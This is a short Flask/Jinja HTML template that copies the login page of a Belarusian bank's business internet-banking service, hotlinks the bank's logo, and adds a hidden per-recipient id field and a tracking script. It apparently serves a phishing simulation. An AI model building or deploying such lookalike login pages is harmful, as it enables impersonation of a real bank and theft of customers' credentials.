<!DOCTYPE html>
<html lang="ru">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Вход в интернет-банк</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style_3.5.css') }}">

</head>

<body>
    <div class="background"></div>
    <div class="top-header">
        <img src="https://dbo.rbank.by/assets/images/pictures/logo.svg" class="logotip" />
        <h1>Интернет-клиент для бизнеса</h1>
    </div>
    <div class="login-box">

        <form action="/site_3.5" method="get">
            <input type="hidden" name="id" value="{{ request.args.get('id') }}">
            <label>Логин<span class="required">*</span></label>
            <input class="логин" type="text" required />

            <label>Пароль<span class="required">*</span></label>
            <input class="пароль" type="password" required />

            <button type="submit" class="submit-btn">Войти</button>

            <p class="note">
                <a href="#"><span class="required">Войти по ЭЦП</span></a>
            </p>
        </form>
    </div>
    <script src="{{ url_for('static', filename='js/track_example_2.js') }}"></script>
</body>

</html>
